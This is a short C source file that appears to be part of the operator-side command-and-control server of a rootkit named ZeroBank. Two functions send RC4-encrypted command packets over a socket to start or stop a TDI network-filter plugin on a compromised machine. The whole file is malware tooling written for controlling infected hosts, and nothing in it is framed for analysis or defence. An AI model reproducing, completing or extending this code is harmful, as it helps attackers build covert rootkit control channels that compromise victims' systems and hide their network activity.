#include "server_globals.h"

VOID rootkit_start_TDI_filter(IN SOCKET sock, IN BYTE PacketType)
{
	INT sendsize = 0;
	ZEROBANK_PACKET_TYPE packet = { 0 };
	packet.PacketType = PacketType;

	sendsize = send_packet_encrypted(sock, RC4_KEY_2, (PZEROBANK_PACKET_TYPE)&packet, sizeof(ZEROBANK_PACKET_TYPE));
	if (sendsize > 0)
		printf("\r\n{ START-TDI-FILTER-PLUGIN } command sent");
	else
		printf("\r\n{ START-TDI-FILTER-PLUGIN } Error sending command: %lu",RtlGetLastWin32Error());

}

VOID rootkit_stop_TDI_filter(IN SOCKET sock, IN BYTE PacketType)
{
	INT sendsize = 0;
	ZEROBANK_PACKET_TYPE packet = { 0 };
	packet.PacketType = PacketType;

	sendsize = send_packet_encrypted(sock, RC4_KEY_2, (PZEROBANK_PACKET_TYPE)&packet, sizeof(ZEROBANK_PACKET_TYPE));
	if (sendsize > 0)
		printf("\r\n{ STOP-TDI-FILTER-PLUGIN } command sent");
	else
		printf("\r\n{ STOP-TDI-FILTER-PLUGIN } Error sending command: %lu", RtlGetLastWin32Error());

}